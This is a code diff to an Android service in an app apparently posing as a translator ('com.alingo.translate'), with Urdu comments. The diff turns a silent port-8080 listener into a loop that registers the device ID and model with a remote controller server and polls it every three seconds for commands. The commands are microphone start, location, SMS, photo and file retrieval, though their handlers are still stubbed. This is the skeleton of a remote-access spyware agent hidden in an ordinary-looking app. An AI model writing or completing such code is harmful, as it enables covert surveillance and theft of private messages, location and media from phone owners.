@@ -8,15 +8,31 @@ import android.app.Service
 import android.content.Intent
 import android.os.Build
 import android.os.IBinder
+import android.provider.Settings
 import android.util.Log
 import com.alingo.translate.MainActivity
-import java.net.ServerSocket
-import kotlin.concurrent.thread
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONObject
+import java.io.IOException
+import java.util.concurrent.TimeUnit
 
 class AgentService : Service() {
 
-    private var serverSocket: ServerSocket? = null
-    private var isListening = true
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(10, TimeUnit.SECONDS)
+        .readTimeout(10, TimeUnit.SECONDS)
+        .build()
+
+    // ⚠️ یہاں اپنے سرور کا IP یا URL ڈالیں
+    // اگر آپ ٹرمکس میں لوکل چلا رہے ہیں اور فون اسی وائی فائی پر ہے:
+    // تو اپنے PC/ٹرمکس کا IP ڈالیں (مثلاً: http://10.241.253.40:5000)
+    // اگر کلاؤڈ پر ہے تو: https://your-server.com
+    private val serverUrl = "http://10.241.253.40:5000"
+    
+    private val deviceId = "android-" + Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+    private var isRunning = true
 
     override fun onCreate() {
         super.onCreate()
@@ -26,37 +42,61 @@ class AgentService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         startForeground(1001, buildNotification())
 
-        // اگر پہلے سے نہیں چل رہا تو سننا شروع کریں
-        if (serverSocket == null) {
-            startListeningForController()
-        }
+        // سرور پر رجسٹر کریں اور پولنگ شروع کریں
+        Thread {
+            registerDevice()
+            startPollingLoop()
+        }.start()
 
         return START_STICKY
     }
 
-    private fun startListeningForController() {
-        thread(isDaemon = true) {
-            try {
-                // AlinGo Controller یہاں (پورٹ 8080) پر کمانڈ بھیجے گا
-                serverSocket = ServerSocket(8080)
-                Log.d("AlinGoAgent", "Agent is silently listening on port 8080")
+    private fun registerDevice() {
+        val json = JSONObject().apply {
+            put("device_id", deviceId)
+            put("device_name", Build.MODEL)
+        }
+        val body = json.toString().toRequestBody("application/json".toMediaType())
+        val request = Request.Builder()
+            .url("$serverUrl/api/register")
+            .post(body)
+            .build()
 
-                while (isListening) {
-                    val client = serverSocket?.accept() ?: break
-                    val command = client.getInputStream().bufferedReader().readLine()
-                    executeCommand(command)
-                    client.close()
-                }
-            } catch (e: Exception) {
-                Log.e("AlinGoAgent", "Listener stopped: ${e.message}")
-            }
+        try {
+            val response = client.newCall(request).execute()
+            Log.d("AlinGoAgent", "Register: ${response.body?.string()}")
+        } catch (e: IOException) {
+            Log.e("AlinGoAgent", "Register failed: ${e.message}")
         }
     }
 
-    private fun executeCommand(command: String?) {
-        if (command == null) return
-        Log.d("AlinGoAgent", "Received command: $command")
+    private fun startPollingLoop() {
+        while (isRunning) {
+            try {
+                val request = Request.Builder()
+                    .url("$serverUrl/api/poll/$deviceId")
+                    .get()
+                    .build()
 
+                val response = client.newCall(request).execute()
+                val bodyString = response.body?.string()
+
+                if (bodyString != null) {
+                    val json = JSONObject(bodyString)
+                    if (!json.isNull("command")) {
+                        val command = json.getString("command")
+                        Log.d("AlinGoAgent", "Received: $command")
+                        executeCommand(command)
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e("AlinGoAgent", "Poll error: ${e.message}")
+            }
+            Thread.sleep(3000) // ہر 3 سیکنڈ بعد
+        }
+    }
+
+    private fun executeCommand(command: String) {
         when (command) {
             "PING" -> Log.d("AlinGoAgent", "PONG")
             "START_MIC" -> { /* MicHandler.start(this) */ }
@@ -64,7 +104,7 @@ class AgentService : Service() {
             "GET_LOCATION" -> { /* LocationHandler.get(this) */ }
             "GET_SMS" -> { /* SmsHandler.get(this) */ }
             "TAKE_PHOTO" -> { /* CameraHandler.capture(this) */ }
-            // مزید کمانڈز یہاں شامل کریں
+            "GET_FILES" -> { /* FileHandler.list(this) */ }
         }
     }
 
@@ -73,19 +113,18 @@ class AgentService : Service() {
             this, 0, Intent(this, MainActivity::class.java),
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
-
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             Notification.Builder(this, "AgentChannel")
-                .setContentTitle("AlinGo Agent Ready")
-                .setContentText("Waiting for controller commands...")
+                .setContentTitle("AlinGo Agent Active")
+                .setContentText("Connected to controller.")
                 .setSmallIcon(android.R.drawable.stat_sys_download_done)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
                 .build()
         } else {
             Notification.Builder(this)
-                .setContentTitle("AlinGo Agent Ready")
-                .setContentText("Waiting for controller commands...")
+                .setContentTitle("AlinGo Agent Active")
+                .setContentText("Connected to controller.")
                 .setSmallIcon(android.R.drawable.stat_sys_download_done)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
@@ -101,8 +140,7 @@ class AgentService : Service() {
     }
 
     override fun onDestroy() {
-        isListening = false
-        try { serverSocket?.close() } catch (_: Exception) {}
+        isRunning = false
         super.onDestroy()
     }
 
